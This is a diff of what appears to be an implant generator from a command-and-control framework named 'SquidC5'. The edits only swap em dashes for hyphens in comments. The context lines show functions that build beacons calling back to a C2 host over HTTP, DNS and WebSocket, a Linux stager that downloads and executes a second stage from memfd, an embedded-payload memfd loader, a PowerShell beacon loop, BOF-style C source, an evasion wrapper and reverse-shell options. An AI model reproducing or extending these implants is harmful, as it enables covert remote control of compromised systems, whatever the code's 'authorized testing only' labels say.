@@ -25,7 +25,7 @@ def generate_with_evasion(
 
 def generate_memory_beacon_python(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
     return f'''#!/usr/bin/env python3
-# SquidC5 memory_beacon_python — authorized testing only
+# SquidC5 memory_beacon_python - authorized testing only
 import json, time, urllib.request, socket, types
 def _run():
     C2 = "http://{host}:{port}{path}"
@@ -58,9 +58,9 @@ types.FunctionType(_run.__code__, globals())()
 
 
 def generate_dns_beacon_python(host: str, port: int, zone: str) -> str:
-    """DNS TXT C2 beacon — queries server DNS listener (authorized lab)."""
+    """DNS TXT C2 beacon - queries server DNS listener (authorized lab)."""
     return f'''#!/usr/bin/env python3
-# SquidC5 dns_beacon_python — authorized testing only
+# SquidC5 dns_beacon_python - authorized testing only
 # Requires: dnspython optional; falls back to raw UDP DNS
 import base64, json, random, socket, struct, time, uuid
 
@@ -159,7 +159,7 @@ def generate_ws_beacon_python(
 ) -> str:
     sch = "wss" if scheme.lower() in ("wss", "https") else "ws"
     return f'''#!/usr/bin/env python3
-# SquidC5 ws_beacon_python — authorized testing only
+# SquidC5 ws_beacon_python - authorized testing only
 # Uses websocket-client if available, else stdlib http.client upgrade is not used;
 # prefer: pip install websocket-client  OR use websockets
 import json, socket, time, random
@@ -175,7 +175,7 @@ def run_ws():
     try:
         import websocket  # type: ignore
     except ImportError:
-        # minimal fallback: HTTP long-poll not available — raise clear error
+        # minimal fallback: HTTP long-poll not available - raise clear error
         raise SystemExit("Install websocket-client: pip install websocket-client")
     url = f"{{SCHEME}}://{{HOST}}:{{PORT}}{{PATH}}"
     ws = websocket.create_connection(url, timeout=30)
@@ -208,7 +208,7 @@ if __name__ == "__main__":
 def generate_linux_stager(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
     """Stage0: download stage1 into memfd and exec (Linux)."""
     return f'''#!/bin/bash
-# SquidC5 linux stage0 stager — authorized testing only
+# SquidC5 linux stage0 stager - authorized testing only
 set -e
 URL="http://{host}:{port}{path}"
 # Stage0 only demonstrates memfd pattern with embedded stage1 beacon
@@ -251,7 +251,7 @@ def generate_windows_ps_beacon(
         note = f"# AEAD PSK configured server-side; prefer agents/windows native for sealed channel\n# PSK hint length={len(psk)}\n"
     else:
         note = "# Plain JSON (set implant_require_auth=false on server for lab, or use sealed native agent)\n"
-    return f'''# SquidC5 windows PowerShell beacon — authorized testing only
+    return f'''# SquidC5 windows PowerShell beacon - authorized testing only
 {note}$C2 = "{sch}://{host}:{port}{path}"
 $SID = $null
 while ($true) {{
@@ -284,7 +284,7 @@ while ($true) {{
 
 def generate_bof_c(host: str, port: int, arch: str = "x64") -> str:
     """Complete BOF-style C source (Beacon Object File conventions) for lab compile."""
-    return f'''/* SquidC5 BOF-style module — authorized testing only
+    return f'''/* SquidC5 BOF-style module - authorized testing only
  * Arch: {arch}
  * Compile (example, mingw):
  *   x86_64-w64-mingw32-gcc -c sc5_bof.c -o sc5_bof.o
@@ -297,7 +297,7 @@ extern "C" {{
 
 /* Minimal declarations for BOF-style entry without full windows.h in unit tests */
 #ifndef _WIN32
-/* Non-Windows stub for CI — operators compile on Windows toolchains */
+/* Non-Windows stub for CI - operators compile on Windows toolchains */
 void go(char* args, int len) {{ (void)args; (void)len; }}
 #else
 #define WIN32_LEAN_AND_MEAN
@@ -337,7 +337,7 @@ def generate_linux_memfd_loader(host: str, port: int, path: str = "/api/v1/impla
     stage1 = generate_memory_beacon_python(host, port, path)
     b64 = base64.b64encode(stage1.encode()).decode()
     return f'''#!/usr/bin/env python3
-# SquidC5 linux memfd loader — authorized testing only
+# SquidC5 linux memfd loader - authorized testing only
 import base64, ctypes, os, sys
 stage = base64.b64decode("{b64}")
 # memfd_create via syscall
@@ -436,7 +436,7 @@ def generate_implant(
     elif family == "reverse_shell_stable":
         if platform == "windows":
             content = (
-                f"# PowerShell reverse shell reconnect note — use sc5 payloads reverse_shell_* "
+                f"# PowerShell reverse shell reconnect note - use sc5 payloads reverse_shell_* "
                 f"or stage-2 stabilize on listener {host}:{port}\n"
             )
         else:
